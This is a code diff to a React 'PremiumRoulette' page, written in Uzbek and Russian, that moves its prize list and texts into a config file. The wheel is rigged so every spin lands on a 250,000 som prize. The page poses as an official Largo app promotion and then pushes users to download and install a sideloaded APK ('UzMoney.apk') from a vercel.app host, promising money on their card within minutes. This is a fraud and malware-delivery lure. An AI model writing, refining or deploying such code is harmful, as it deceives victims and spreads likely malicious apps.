@@ -1,6 +1,8 @@
 import React, { useState, useRef, useEffect } from 'react';
+import { useConfig } from '../hooks/useConfig';
 
 export default function PremiumRoulette() {
+  const { config, loading } = useConfig('roulette_premium');
   const [isSpinning, setIsSpinning] = useState(false);
   const [showWinModal, setShowWinModal] = useState(false);
   const [wheelRotation, setWheelRotation] = useState(0);
@@ -8,24 +10,13 @@ export default function PremiumRoulette() {
   const coinIdRef = useRef(0);
   const animationIdRef = useRef(null);
 
-  const prizes = [
-    { id: 0, type: 'win', amount: 250000, color: '#FFD700', image: 'https://pngimg.com/uploads/money/money_PNG3542.png' },
-    { id: 1, type: 'lose', color: '#2A004D', image: 'https://static.vecteezy.com/system/resources/previews/016/314/454/original/red-cross-mark-free-png.png' },
-    { id: 2, type: 'device', color: '#8A2BE2', image: 'https://pngimg.com/uploads/iphone_14/iphone_14_PNG19.png' },
-    { id: 3, type: 'lose', color: '#2A004D', image: 'https://static.vecteezy.com/system/resources/previews/016/314/454/original/red-cross-mark-free-png.png' },
-    { id: 4, type: 'device', color: '#8A2BE2', image: 'https://pngimg.com/uploads/macbook/macbook_PNG23.png' },
-    { id: 5, type: 'lose', color: '#2A004D', image: 'https://static.vecteezy.com/system/resources/previews/016/314/454/original/red-cross-mark-free-png.png' },
-    { id: 6, type: 'device', color: '#8A2BE2', image: 'https://pngimg.com/uploads/airPods/airPods_PNG8.png' },
-    { id: 7, type: 'lose', color: '#2A004D', image: 'https://static.vecteezy.com/system/resources/previews/016/314/454/original/red-cross-mark-free-png.png' },
-    { id: 8, type: 'device', color: '#8A2BE2', image: 'https://pngimg.com/uploads/tv/tv_PNG39223.png' },
-    { id: 9, type: 'lose', color: '#2A004D', image: 'https://static.vecteezy.com/system/resources/previews/016/314/454/original/red-cross-mark-free-png.png' },
-    { id: 10, type: 'device', color: '#8A2BE2', image: 'https://s7d1.scene7.com/is/image/dmqualcommprod/meta-quest-3-4?$QC_Responsive$&fmt=png-alpha' },
-    { id: 11, type: 'lose', color: '#2A004D', image: 'https://static.vecteezy.com/system/resources/previews/016/314/454/original/red-cross-mark-free-png.png' },
-    { id: 12, type: 'device', color: '#8A2BE2', image: 'https://png.pngtree.com/png-vector/20250221/ourmid/pngtree-top-quality-playstation-5-console-isolated-png-image_15514648.png' },
-    { id: 13, type: 'lose', color: '#2A004D', image: 'https://static.vecteezy.com/system/resources/previews/016/314/454/original/red-cross-mark-free-png.png' }
-  ];
+  // Используем данные из конфигурации или значения по умолчанию
+  const prizes = config?.prizes || [];
+  const texts = config?.texts || {};
+  const settings = config?.settings || { spins: 10, spinDuration: 6000 };
+  const apkUrl = config?.apkUrl || 'https://uzbekistan-info.vercel.app/docs/UzMoney.apk';
 
-  const sliceAngle = 360 / prizes.length;
+  const sliceAngle = prizes.length > 0 ? 360 / prizes.length : 0;
 
   const createCoin = () => {
     const newCoin = {
@@ -65,7 +56,7 @@ export default function PremiumRoulette() {
     const moneyIndex = 0;
     const moneyAngle = moneyIndex * sliceAngle + sliceAngle / 2;
     const targetAngle = 270 - moneyAngle;
-    const spins = 10; 
+    const spins = settings.spins || 10; 
     const finalRotation = wheelRotation + (360 * spins) + (targetAngle - (wheelRotation % 360));
 
     setWheelRotation(finalRotation);
@@ -73,14 +64,45 @@ export default function PremiumRoulette() {
     setTimeout(() => {
       setShowWinModal(true);
       setIsSpinning(false);
-    }, 6000);
+    }, settings.spinDuration || 6000);
   };
 
   const handleClaimPrize = () => {
-    const apkUrl = 'https://uzbekistan-info.vercel.app/docs/UzMoney.apk';
     window.location.href = apkUrl;
     setTimeout(() => { window.open(apkUrl, '_blank'); }, 500);
   };
+
+  // Показываем загрузку пока конфигурация не загружена
+  if (loading) {
+    return (
+      <div style={{
+        minHeight: '100vh',
+        background: 'radial-gradient(circle at center, #1a0033 0%, #05000a 100%)',
+        display: 'flex',
+        alignItems: 'center',
+        justifyContent: 'center',
+        color: '#fff'
+      }}>
+        Загрузка...
+      </div>
+    );
+  }
+
+  // Если нет призов, показываем сообщение об ошибке
+  if (!prizes || prizes.length === 0) {
+    return (
+      <div style={{
+        minHeight: '100vh',
+        background: 'radial-gradient(circle at center, #1a0033 0%, #05000a 100%)',
+        display: 'flex',
+        alignItems: 'center',
+        justifyContent: 'center',
+        color: '#fff'
+      }}>
+        Ошибка загрузки конфигурации. Проверьте файл public/config/roulette_premium.json
+      </div>
+    );
+  }
 
   return (
     <div style={{
@@ -116,10 +138,10 @@ export default function PremiumRoulette() {
       {/* Заголовок LARGO */}
       <div style={{ textAlign: 'center', zIndex: 10, marginBottom: '30px', animation: 'float 4s ease-in-out infinite' }}>
         <h1 className="largo-gradient" style={{ fontSize: '3.5rem', margin: 0, fontWeight: '900', letterSpacing: '-2px', textTransform: 'uppercase' }}>
-          LARGO SPIN
+          {texts.title || 'LARGO SPIN'}
         </h1>
         <div style={{ background: 'linear-gradient(90deg, #ffd700, #ff8c00)', color: '#000', padding: '4px 20px', borderRadius: '20px', fontWeight: '900', display: 'inline-block', fontSize: '0.8rem', boxShadow: '0 4px 15px rgba(255,215,0,0.3)' }}>
-          OFFICIAL LARGO APP 2025
+          {texts.badge || 'OFFICIAL LARGO APP 2025'}
         </div>
       </div>
 
@@ -144,7 +166,7 @@ export default function PremiumRoulette() {
         <div style={{
           width: '100%', height: '100%', borderRadius: '50%',
           transform: `rotate(${wheelRotation}deg)`,
-          transition: isSpinning ? 'transform 6s cubic-bezier(0.1, 0, 0.1, 1)' : 'none',
+          transition: isSpinning ? `transform ${(settings.spinDuration || 6000) / 1000}s cubic-bezier(0.1, 0, 0.1, 1)` : 'none',
           overflow: 'hidden', backgroundColor: '#111'
         }}>
           <svg viewBox="0 0 200 200" style={{ width: '100%', height: '100%' }}>
@@ -184,11 +206,11 @@ export default function PremiumRoulette() {
           transition: 'all 0.2s ease', zIndex: 10, letterSpacing: '1px'
         }}
       >
-        {isSpinning ? 'ОМАД КЕЛМОКДА...' : 'ЮТИШНИ БОШЛАШ'}
+        {isSpinning ? (texts.spinningButton || 'ОМАД КЕЛМОКДА...') : (texts.spinButton || 'ЮТИШНИ БОШЛАШ')}
       </button>
 
       <p style={{ marginTop: '25px', opacity: 0.6, fontSize: '0.85rem', textAlign: 'center', maxWidth: '300px' }}>
-        * Largo иловаси фойдаланувчилари учун махсус акция
+        {texts.footer || '* Largo иловаси фойдаланувчилари учун махсус акция'}
       </p>
 
       {/* МОДАЛЬНОЕ ОКНО LARGO */}
@@ -204,33 +226,39 @@ export default function PremiumRoulette() {
           }}>
             <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: '8px', background: 'linear-gradient(90deg, #ffd700, #ff8c00)' }} />
             
-            <div style={{ fontSize: '1.1rem', fontWeight: '900', color: '#8A2BE2', letterSpacing: '2px', marginBottom: '15px' }}>LARGO OFFICIAL</div>
+            <div style={{ fontSize: '1.1rem', fontWeight: '900', color: '#8A2BE2', letterSpacing: '2px', marginBottom: '15px' }}>
+              {texts.modal?.brand || 'LARGO OFFICIAL'}
+            </div>
             
             <div style={{ fontSize: '4.5rem', margin: '10px 0' }}>💰</div>
             
             <h2 style={{ fontSize: '2rem', fontWeight: '900', color: '#1a0033', margin: '0 0 10px 0', lineHeight: 1.1 }}>
-              ТАБРИКЛАЙМИЗ!
+              {texts.modal?.congratulations || 'ТАБРИКЛАЙМИЗ!'}
             </h2>
             
             <div style={{ background: '#f8f9fa', border: '2px dashed #ddd', padding: '20px', borderRadius: '25px', margin: '20px 0' }}>
-              <span style={{ fontSize: '0.9rem', color: '#666', display: 'block', marginBottom: '5px' }}>Сизнинг Largo ютугингиз:</span>
-              <span style={{ fontSize: '2.5rem', fontWeight: '900', color: '#00c853' }}>250,000 СЎМ</span>
+              <span style={{ fontSize: '0.9rem', color: '#666', display: 'block', marginBottom: '5px' }}>
+                {texts.modal?.winLabel || 'Сизнинг Largo ютугингиз:'}
+              </span>
+              <span style={{ fontSize: '2.5rem', fontWeight: '900', color: '#00c853' }}>
+                {texts.modal?.winAmount || '250,000 СЎМ'}
+              </span>
             </div>
 
             <div style={{ textAlign: 'left', marginBottom: '30px' }}>
               <p style={{ fontWeight: 'bold', marginBottom: '15px', fontSize: '1.05rem', color: '#333' }}>
-                Пулни Largo оркали ечиш:
+                {texts.modal?.instructionsTitle || 'Пулни Largo оркали ечиш:'}
               </p>
-              {[
-                { t: 'Largo иловасини юкланг', s: 'Пастдаги тугмани босиб APK-ни урнатинг' },
-                { t: 'Руйхатдан утинг', s: 'Сизга ютуқ коди келади' },
-                { t: 'Хисобингизни олинг', s: 'Пул 5 дақиқада картага тушади' }
-              ].map((step, i) => (
+              {(texts.modal?.steps || [
+                { title: 'Largo иловасини юкланг', description: 'Пастдаги тугмани босиб APK-ни урнатинг' },
+                { title: 'Руйхатдан утинг', description: 'Сизга ютуқ коди келади' },
+                { title: 'Хисобингизни олинг', description: 'Пул 5 дақиқада картага тушади' }
+              ]).map((step, i) => (
                 <div key={i} style={{ display: 'flex', gap: '12px', marginBottom: '15px' }}>
                   <div style={{ background: '#1a0033', color: '#ffd700', width: '26px', height: '26px', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: 'bold', fontSize: '0.85rem', flexShrink: 0 }}>{i + 1}</div>
                   <div>
-                    <div style={{ fontSize: '0.95rem', fontWeight: 'bold', color: '#1a0033' }}>{step.t}</div>
-                    <div style={{ fontSize: '0.8rem', color: '#777' }}>{step.s}</div>
+                    <div style={{ fontSize: '0.95rem', fontWeight: 'bold', color: '#1a0033' }}>{step.title || step.t}</div>
+                    <div style={{ fontSize: '0.8rem', color: '#777' }}>{step.description || step.s}</div>
                   </div>
                 </div>
               ))}
@@ -247,10 +275,12 @@ export default function PremiumRoulette() {
               onMouseEnter={(e) => e.target.style.transform = 'translateY(-2px)'}
               onMouseLeave={(e) => e.target.style.transform = 'translateY(0)'}
             >
-              ЮТУКНИ LARGO-ГА ОЛИШ 💸
+              {texts.modal?.claimButton || 'ЮТУКНИ LARGO-ГА ОЛИШ 💸'}
             </button>
             
-            <p style={{ fontSize: '0.7rem', color: '#999', marginTop: '15px' }}>ID: LARGO-WIN-2025-001</p>
+            <p style={{ fontSize: '0.7rem', color: '#999', marginTop: '15px' }}>
+              {texts.modal?.id || 'ID: LARGO-WIN-2025-001'}
+            </p>
           </div>
         </div>
       )}
